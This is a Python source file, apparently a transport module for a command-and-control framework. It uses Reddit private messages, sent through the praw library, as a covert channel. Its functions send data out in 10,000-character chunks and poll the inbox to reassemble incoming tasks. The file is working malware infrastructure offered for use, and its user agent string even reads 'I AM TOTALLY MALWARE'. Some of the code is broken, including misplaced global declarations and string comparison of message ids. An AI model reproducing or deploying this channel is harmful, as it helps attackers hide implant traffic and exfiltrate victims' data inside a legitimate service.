# Utilizes reddit PMs as a c2 channel
# Create a script app, and populate the config
# Pretty much just utilzies the 'praw' library, 'pip install praw'
# In this case, we're just gonna send messages to ourself, the user in USERNAME
# Messages are only deleted upon retrieval, regardless of role
# TODO: account for 10k character limit in PMs
import praw
from time import sleep
import re

# START OF CONFIG
CLIENT_ID = ""
CLIENT_SECRET = ""
PASSWORD = ""
USER_AGENT = "I AM TOTALLY MALWARE by /u/"
USERNAME = ""
SEND_NAME = "New4You" # Subject of PM
RECV_NAME = "Resp4You"
# END OF CONFIG

# IF YOU NEED DEBUG LOGGING:
# import logging

# handler = logging.StreamHandler()
# handler.setLevel(logging.DEBUG)
# logger = logging.getLogger('prawcore')
# logger.setLevel(logging.DEBUG)
# logger.addHandler(handler)
# </DEBUG LOGGING>


def prepTransport():
	# Auth as a script app
	global reddit # DEBUG: Not sure if needed
	global TASK_ID
	TASK_ID = "0"
	reddit = praw.Reddit(client_id=CLIENT_ID,
		client_secret=CLIENT_SECRET,
		password=PASSWORD,
		user_agent=USER_AGENT,
		username=USERNAME)
	# Debug, verify that we are connected
	print "We have successfully authenticated: %s" %(reddit)
	return reddit

def sendData(data):
	if len(data) > 10000:
		data_list = [data[i:i+10000] for i in range(0, len(data), 10000)]
		sent_counter = 1
		for message in data_list:
			cur_subject = SEND_NAME + (" | " + str(sent_counter) + "/" + str(len(data_list)))
			reddit.redditor(USERNAME).message(cur_subject, message)
			sent_counter += 1
		return 0
	else:
		reddit.redditor(USERNAME).message(SEND_NAME, data)
		return 0


def retrieveData():
	counter_pattern = re.compile("^.* \| [0-9]+/[0-9]+$")
	total_count = re.compile("^.*/[0-9]+$")
	current_target = 1
	task = ""
	# First, we'll see if there's a new message, if it has a counter, 
	#  we'll take it into account, and loop through the messages to find
	#  our first one.
	while True:
		for message in reddit.inbox.messages(limit=1):
			if message.id <= TASK_ID:
				sleep(5)
				pass
			
			if counter_pattern.match(message.subject) and (RECV_NAME in message.subject):
				# This is incredibly dirty, I apologize in advance. Basically,
				#   we get the count, find the first message, 
				#   set it to the TASK_ID, and start to compile the full task
				counter_target = message.subject.split("/")[1]
				
				if message.subject == (RECV_NAME + " | 1/" + str(counter_target)):
					global TASK_ID
					TASK_ID = message.id
					task += message.body
					current_target += 1
					sleep(1)
					pass
				
				elif int(current_target) > int(counter_target):
					global TASK_ID
					TASK_ID = message.id
					return task
				
				elif message.subject != (RECV_NAME + " | " + str(current_target) + "/" + str(counter_target)):
					# We're getting these out of order, time for us to find the next message, and loop through it
					while True:
						msgiter = iter(reddit.inbox.messages())
						for submessage in msgiter:
							if int(current_target) > int(counter_target):
								global TASK_ID
								TASK_ID = message.id
								return task
							if submessage.subject == (RECV_NAME + " | " + str(current_target) + "/" + str(counter_target)):
								current_target += 1
								task += submessage.body
								# sleep(0.1)
								break
							if submessage.subject != (RECV_NAME + " | " + str(current_target) + "/" + str(counter_target)):
								# sleep(0.1)
								continue
							else:
								pass
				
			# Got our new task
			elif message.subject == RECV_NAME:
				task = message.body
				global TASK_ID
				TASK_ID = message.id
				return task
			
			else:
				# message.id isn't right, but we don't have a task yet
				sleep(5)
				pass